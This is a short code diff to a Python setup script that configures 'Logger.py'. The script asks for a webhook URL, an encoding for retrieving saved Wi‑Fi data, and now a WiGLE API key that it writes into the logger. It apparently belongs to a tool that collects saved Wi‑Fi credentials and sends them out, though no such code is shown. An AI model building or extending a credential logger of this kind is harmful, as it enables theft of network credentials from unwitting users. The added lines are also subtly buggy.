@@ -1,6 +1,7 @@
 file_path = 'Logger.py'
 url = input('Your webhook URL here: ')
 encoding = input('Input preferred encoding for getting saved wifi. Leave empty for utf-8 (the standard): ')
+wigleapi = input('Enter you WiGLE api key (encoded for use) here (leave empty for no WiGLE api):')
 if encoding == '':
     encoding = 'utf-8'
 
@@ -15,6 +16,9 @@ if len(lines) >= 36:
 
     # Modify line 36 with the encoding information
     lines[35] = f'wifiencoding="{encoding}"\n'  # line 36
+    if wigleapi is not '':
+     lines[36]=f'api_key = "{wigleapi}"'
+
 
     # Write the updated content back to the file
     with open(file_path, 'w') as file:
